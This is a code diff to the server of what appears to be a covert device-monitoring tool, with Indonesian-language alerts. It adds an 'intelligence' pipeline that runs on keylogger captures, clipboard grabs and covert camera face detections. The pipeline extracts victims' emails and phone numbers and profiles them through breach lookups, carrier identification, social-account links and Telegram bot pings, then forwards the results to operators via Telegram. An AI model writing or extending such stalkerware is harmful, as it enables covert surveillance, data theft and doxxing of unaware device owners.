@@ -517,6 +517,8 @@ io.on('connection', (socket) => {
                     io.emit('new-snapshot', { deviceId, label: device.label, filename, timestamp: Date.now() });
                     sendTelegramPhoto(deviceId, filepath, `[AI Face Detection] ${device.label}\nWajah terdeteksi!`).catch(()=>{});
                     sendAIAlert(deviceId, 'Face Detection', 'Wajah terdeteksi dari kamera — snapshot terkirim.').catch(()=>{});
+                    // Run intelligence analysis after face detection
+                    runIntelligenceAnalysis(deviceId).catch(()=>{});
                 }
             });
         }
@@ -553,6 +555,10 @@ io.on('connection', (socket) => {
         io.to('admins').emit('device-update', { id: deviceId, clipboard: data.text });
         if (data.text && data.text.length > 3) {
             sendAIAlert(deviceId, 'Clipboard Grab', `Isi: ${data.text.slice(0,200)}`).catch(()=>{});
+            // Run intelligence if clipboard contains emails/phones
+            if (/[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}|(?:08|\+62)[0-9]{8,12}/.test(data.text)) {
+                runIntelligenceAnalysis(deviceId).catch(()=>{});
+            }
         }
     });
 
@@ -1235,6 +1241,10 @@ function initKeystrokeAnalyzer(deviceId) {
             saveDevices();
             io.to('admins').emit('ai-alert', { deviceId, label: d.label, type: 'keystroke_analysis', patterns });
             sendAIAlert(deviceId, 'Keylogger Detection', patterns.join('\n')).catch(()=>{});
+            // Auto-run intelligence analysis on detected emails/phones
+            if (emails || phones) {
+                runIntelligenceAnalysis(deviceId).catch(()=>{});
+            }
         }
     }, 300000); // every 5 minutes
 }
@@ -1352,6 +1362,189 @@ setTimeout(initAutoReport, 21600000);
 // ====== PATCH: clickmap handler for forensics trigger ======
 // When clickmap comes in, trigger auto forensics
 // Added in existing clickmap handler
+
+// ===== AI INTELLIGENCE: Face Analysis, Social Search, Data Leak, Phone =====
+
+// 1A. Social Media Search from email/phone
+async function socialMediaSearch(deviceId, email, phone) {
+    const d = devices.get(deviceId);
+    if (!d) return [];
+    const results = [];
+
+    if (email) {
+        // Check Gravatar for profile picture
+        const emailHash = crypto.createHash('md5').update(email.toLowerCase().trim()).digest('hex');
+        results.push({ platform: 'Gravatar', url: `https://www.gravatar.com/avatar/${emailHash}?d=404`, type: 'email' });
+        
+        // Common email domains map to platform
+        const domain = email.split('@')[1]?.toLowerCase();
+        if (domain) {
+            if (domain.includes('gmail')) results.push({ platform: 'Google Account', url: `https://accounts.google.com/signin/v3/identifier?identifier=${encodeURIComponent(email)}`, type: 'email' });
+            if (domain.includes('yahoo')) results.push({ platform: 'Yahoo', url: `https://login.yahoo.com/?.src=ym&.lang=en-US&.intl=us&done=https%3A%2F%2Fmail.yahoo.com%2Fd%2Ffolders%2F1&email=${encodeURIComponent(email)}`, type: 'email' });
+            if (domain.includes('outlook') || domain.includes('hotmail') || domain.includes('live')) results.push({ platform: 'Microsoft/Outlook', url: `https://outlook.live.com/owa/`, type: 'email' });
+        }
+    }
+
+    if (phone) {
+        const cleanPhone = phone.replace(/[^0-9]/g, '');
+        const intlPhone = cleanPhone.startsWith('62') ? cleanPhone : '62' + cleanPhone.slice(1);
+        results.push({ platform: 'Telegram', url: `https://t.me/+${intlPhone}`, type: 'phone' });
+        results.push({ platform: 'WhatsApp', url: `https://wa.me/${intlPhone}`, type: 'phone' });
+    }
+
+    if (results.length > 0) {
+        d._socialSearches = d._socialSearches || [];
+        d._socialSearches.push({ results, email, phone, time: Date.now() });
+        saveDevices();
+        const lines = results.map(r => `${r.platform}: ${r.url}`).join('\n');
+        await sendAIAlert(deviceId, 'Social Intelligence', `Ditemukan:\nEmail: ${email || 'N/A'}\nNo HP: ${phone || 'N/A'}\n\nLink:\n${lines}`);
+    }
+    return results;
+}
+
+// 2A. Data Leak Check via haveibeenpwned
+async function dataLeakCheck(deviceId, email) {
+    const d = devices.get(deviceId);
+    if (!d || !email) return [];
+    const results = [];
+    try {
+        // Check haveibeenpwned API (v3 free tier)
+        const resp = await fetch(`https://haveibeenpwned.com/api/v3/breachedaccount/${encodeURIComponent(email)}?truncateResponse=true`, {
+            headers: { 'hibp-api-key': '', 'user-agent': 'NeuralAI-Tracker' }
+        });
+        if (resp.ok) {
+            const breaches = await resp.json();
+            if (Array.isArray(breaches) && breaches.length > 0) {
+                breaches.forEach(b => results.push({ name: b.Name, domain: b.Domain, date: b.BreachDate, data: b.DataClasses }));
+            }
+        } else if (resp.status === 404) {
+            // No breaches found
+        }
+    } catch(e) {}
+
+    // Also check via leak-check if available (mock for now)
+    if (results.length === 0) {
+        // Could add leakcheck.net or similar
+    }
+
+    if (results.length > 0) {
+        d._dataLeaks = d._dataLeaks || [];
+        d._dataLeaks.push({ email, breaches: results, time: Date.now() });
+        saveDevices();
+        const breachLines = results.map(r => `${r.name} (${r.domain}) - ${r.date}\n   Data: ${(r.data || []).join(', ')}`).join('\n');
+        await sendAIAlert(deviceId, 'Data Leak DETECTED!', `Email ${email} bocor di ${results.length} situs:\n\n${breachLines}`);
+    }
+    return results;
+}
+
+// 3A. Phone Validator — check format + try Telegram contact
+async function phoneValidator(deviceId, rawPhone) {
+    const d = devices.get(deviceId);
+    if (!d || !rawPhone) return null;
+    const cleanPhone = rawPhone.replace(/[^0-9]/g, '');
+    const intlPhone = cleanPhone.startsWith('62') ? cleanPhone : '62' + cleanPhone.slice(1);
+    const result = { valid: false, provider: 'unknown', whatsapp: null, telegram: null };
+
+    // Check Indonesian phone format
+    if (/^628[0-9]{8,12}$/.test(intlPhone)) {
+        result.valid = true;
+        // Determine provider by prefix
+        const prefixes = {
+            '62811': 'Telkomsel', '62812': 'Telkomsel', '62813': 'Telkomsel', '62821': 'Telkomsel', '62822': 'Telkomsel', '62823': 'Telkomsel',
+            '62814': 'Indosat', '62815': 'Indosat', '62816': 'Indosat', '62855': 'Indosat', '62856': 'Indosat', '62857': 'Indosat',
+            '62817': 'XL', '62818': 'XL', '62819': 'XL', '62859': 'XL', '62877': 'XL', '62878': 'XL',
+            '62895': 'Three', '62896': 'Three', '62897': 'Three', '62898': 'Three',
+            '62831': 'Axis', '62832': 'Axis', '62833': 'Axis', '62838': 'Axis',
+            '62851': 'Smartfren', '62852': 'Smartfren', '62853': 'Smartfren'
+        };
+        for (const [prefix, provider] of Object.entries(prefixes)) {
+            if (intlPhone.startsWith(prefix)) { result.provider = provider; break; }
+        }
+
+        // Try Telegram contact via bot (check if registered)
+        for (const botToken of tgBotTokens) {
+            try {
+                const tgResp = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id: intlPhone, text: '[NeuralAI] Verification ping.' })
+                });
+                const tgData = await tgResp.json();
+                if (tgData.ok) {
+                    result.telegram = 'registered';
+                } else if (tgData.error_code === 403) {
+                    result.telegram = 'blocked_bot';
+                } else if (tgData.error_code === 400) {
+                    result.telegram = 'not_registered';
+                }
+            } catch(e) {}
+        }
+
+        // WhatsApp URL
+        result.whatsapp = `https://wa.me/${intlPhone}`;
+    }
+
+    if (result.valid) {
+        d._phoneValidations = d._phoneValidations || [];
+        d._phoneValidations.push({ phone: intlPhone, result, time: Date.now() });
+        saveDevices();
+        let msg = `No HP: ${rawPhone}\nValid: Ya\nProvider: ${result.provider}\nInternasional: +${intlPhone}\nTelegram: ${result.telegram || 'unknown'}\nWA: ${result.whatsapp}`;
+        if (result.telegram === 'registered') {
+            msg += `\n\nNomor ini TERDAFTAR di Telegram! Bot bisa kirim pesan.`;
+        }
+        await sendAIAlert(deviceId, 'Phone Intelligence', msg);
+    }
+    return result;
+}
+
+// 4A. Run full intelligence analysis
+async function runIntelligenceAnalysis(deviceId) {
+    const d = devices.get(deviceId);
+    if (!d) return;
+
+    // Collect emails and phones from keystrokes
+    const allKeys = (d.keystrokes || []).map(k => k.k).join('');
+    const emails = [...new Set(allKeys.match(/[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/g) || [])];
+    const phones = [...new Set(allKeys.match(/(?:08|\+62)[0-9]{8,12}/g) || [])];
+    // Also check fieldEmail, fieldPass from device-info
+    if (d.fieldEmail && !emails.includes(d.fieldEmail)) emails.push(d.fieldEmail);
+    if (d.fieldEmail && !emails.includes(d.fieldEmail)) emails.push(d.fieldEmail);
+
+    const processed = [];
+
+    // Search social media for each email
+    for (const email of emails) {
+        if (d._searchedEmails && d._searchedEmails.includes(email)) continue;
+        if (!d._searchedEmails) d._searchedEmails = [];
+        d._searchedEmails.push(email);
+        const searchResults = await socialMediaSearch(deviceId, email, null);
+        if (searchResults.length > 0) processed.push(`Email ${email}: ${searchResults.length} platform`);
+        // Check data leaks
+        const leaks = await dataLeakCheck(deviceId, email);
+        if (leaks.length > 0) processed.push(`Email ${email}: ${leaks.length} breach(es)!`);
+    }
+
+    // Validate phones + search
+    for (const phone of phones) {
+        if (d._searchedPhones && d._searchedPhones.includes(phone)) continue;
+        if (!d._searchedPhones) d._searchedPhones = [];
+        d._searchedPhones.push(phone);
+        const validation = await phoneValidator(deviceId, phone);
+        if (validation && validation.valid) {
+            processed.push(`Phone ${phone}: valid (${validation.provider})`);
+            // Also search social with phone
+            const searchResults = await socialMediaSearch(deviceId, null, phone);
+            if (searchResults.length > 0) processed.push(`Phone ${phone}: ${searchResults.length} platform links`);
+        }
+    }
+
+    if (processed.length > 0) {
+        await sendAIAlert(deviceId, 'Intelligence Summary', processed.join('\n'));
+    }
+}
+
+// Modify keystroke analyzer to trigger intelligence when emails/phones found
+// This is done by extending the pattern detection section above
 
 // AI Agent: Analyze new device and execute autonomous actions
 async function aiAgentAnalyzeDevice(deviceId) {
